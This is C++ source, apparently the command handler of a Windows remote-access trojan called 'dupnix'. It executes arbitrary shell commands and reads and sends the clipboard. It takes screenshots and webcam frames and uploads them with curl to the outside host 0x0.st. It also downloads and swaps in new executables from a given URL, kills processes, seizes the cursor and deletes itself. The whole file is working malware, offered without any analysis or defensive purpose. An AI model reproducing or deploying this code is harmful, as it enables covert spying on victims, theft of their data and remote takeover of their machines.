#include <fstream>

using namespace std;

void commands(string command, string parameters) {
	bool done = true;
	fstream file;
	if (command == "Status") {
		string s; stringstream ss;
		Send(getStatus());
		done = false;
	}
	else if (command == "cmd") {
		Send(exec(parameters.c_str()));
		system(parameters.c_str());
	}
	else if (command == "SetCursor") {
		string x = "", y;
		for (int i = 0; i < parameters.length(); i++)
		{
			if (parameters[i] != ',')
				x += parameters[i];
			else break;
		}
		y = parameters.substr(x.length() + 1, parameters.length());
		int x1, y1;
		x1 = atoi(x.c_str());
		y1 = atoi(y.c_str());
		SetCursorPos(x1, y1);
	}
	else if (command == "BlockCursor") {
		int s = atoi(parameters.c_str());
		clock_t start = clock();
		while (true) {
			clock_t stop = clock();
			double time = time_lenght(start, stop);
			if (time > s)break;
			SetCursorPos(0, 0);
			Sleep(5);
		}
	}
	else if (command == "Volume") {
		if (parameters.empty()) {
			Send(to_string(ChangeVolume()));
			return;
		}
		double volume = ChangeVolume();
		if (parameters[0] == '+') volume += atoi(parameters.substr(1, 3).c_str());
		else if (parameters[0] == '-') volume -= atoi(parameters.substr(1, 3).c_str());
		else volume = atoi(parameters.c_str());
		
		if (volume < 0) volume = 0;
		if (volume > 100) volume = 100;

		volume *= 0.01;
		ChangeVolume(volume,1);
		Send("Current Volume: " + to_string(volume*100));
		done = false;
	}
	else if (command == "BlockClipboard")
	{
		if (parameters == "true")  OpenClipboard(nullptr);
		else CloseClipboard();

	}
	else if (command == "SetID")
	{
		setID(parameters);
		cout << "New ID: " + parameters << endl;
	}
	else if (command == "Press")
	{
		Sleep(500);
		for (int i = 0; i < parameters.length(); i++)
		{
			if (parameters[i] >= 65 && parameters[i] <= 90)press(parameters[i], 1); //for capital letters
			else
				switch (parameters[i]) { //for special chars
				case 33:
				case 64:
				case 35:
				case 36:
				case 37:
				case 94:
				case 38:
				case 42:
				case 40:
				case 41:
				case 95:
				case 43:
				case 124:
				case 125:
				case 123:
				case 58:
				case 34:
				case 60:
				case 62:
				case 63:
					press(parameters[i], 1);
					break;
				default: press(parameters[i]);
				}

		}
	}
	else if (command == "SendClipboard")
	{
		HANDLE clip = 0;
		OpenClipboard(NULL);

		if (IsClipboardFormatAvailable(CF_TEXT))
		{
			clip = GetClipboardData(CF_TEXT);
		}
		else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
		{
			clip = GetClipboardData(CF_UNICODETEXT);
		}
		CloseClipboard();

		char* buff = (char*)clip;
		string text;
		if (buff) text = buff;
		Send(text);
		done = false;
	}
	else if (command == "Screenshot") {

		string path = get_path() + "ss.jpg";

		HWND hwnd = GetDesktopWindow();
		Mat src = captureScreenMat(hwnd);

		// save img
		imwrite("ss.jpg", src);

		string l = "curl -F file=@" + path + " https://0x0.st -o buff.jd";
		system(l.c_str()); l.clear();
		fstream file; file.open("buff.jd", ios::in); file >> l;
		Send(l);
		string buff = get_path() + "buff.jd";
		remove(buff.c_str());
		remove(path.c_str());
		done = false;
	}
	else if (command == "msgbox") { //"Text",number,"Title"

		file.open("msg.vbs", ios::out);
		while (true) {
			int find1 = parameters.find("\\");
			if (find1 != string::npos) parameters.erase(find1, 1);
			else break;
		}
		file << "x=msgbox(" << parameters << ")";
		file.close();
		system("start msg.vbs");
		Sleep(1000);
		remove("msg.vbs");

	}
	else if (command == "Hotkey") {
		hotkeys(parameters + "+");
	}
	else if (command == "help") {
		help(parameters);
		done = false;
	}
	else if (command == "Delitself") {
		fstream cmd;
		cmd.open("sth.bat", ios::out);
		cmd << "taskkill /im " + get_exe() + " /t /f\n";
		cmd << "del \"" + get_exe() + "\" \"last\" \"ID.id\"\n";
		cmd << "exit";
		cmd.close();
		system("start /min sth.bat");
	}
	else if (command == "Update") {
		string cmd = "curl " + parameters + " -o update.exe";
		system(cmd.c_str());

		fstream f;
		f.open("update.bat", ios::out);
		f << "taskkill /IM " + get_exe() + " /F\n";
		f << "del " + get_exe() << endl;
		f << "ren \"update.exe\" \"" + get_exe() + "\"" << endl;
		f << "start " + get_exe() << endl;
		f << "exit";
		system("start /min update.bat");
	}
	else if (command == "Taskkill") {
		string cmd = "taskkill /f /im " + parameters;
		system(cmd.c_str());
	}
	else if (command == "ProcessList") {
		string s = exec("tasklist");
		string list = "";
		int pos = s.find(".exe");
		while (pos != string::npos) {
			string reversed = "exe.";
			int i = pos;
			while (s[i] != '\n') {
				i--;
				reversed += s[i];
			}
			reverse(reversed.begin(), reversed.end());
			list += reversed;
			s.erase(pos - abs(i - pos), (pos - i) + 4);
			pos = s.find(".exe");
		}
		Send(list);
		done = false;
	}
	else if (command == "IsFileExits") {
		Send("File: " + parameters + (filexits(parameters) ? " exits" : " not exits"));
		done = false;
	}
	else if (command == "WebcamView") {

		VideoCapture cap(0);

		// Get the frame
		Mat save_img; cap >> save_img;

		if (save_img.empty())
		{
			Send("Something is wrong with the webcam, could not get frame.");
		}
		// Save the frame into a file
		imwrite("wcm.jpg", save_img); // A JPG FILE IS BEING SAVED


		string path = get_path() + "wcm.jpg";


		string l = "curl -F file=@" + path + " https://0x0.st -o buff.jd";
		system(l.c_str()); l.clear();
		fstream file; file.open("buff.jd", ios::in); file >> l;
		Send(l);
		string buff = get_path() + "buff.jd";
		remove(buff.c_str());
		remove(path.c_str());

	}
	else if (command == "Sleep") {
		Sleep(atoi(parameters.c_str()) * 1000);
	}
	else if (command == "ErrorSound") {
		MessageBeep(1);
	}
	else {
		Send("Command not found, use <ID> help to check list of all commands");
		done = false;
	}
	if (done) Send("Done."); //If you see it that means dupnix didnt crashed so command have done sucessfully
}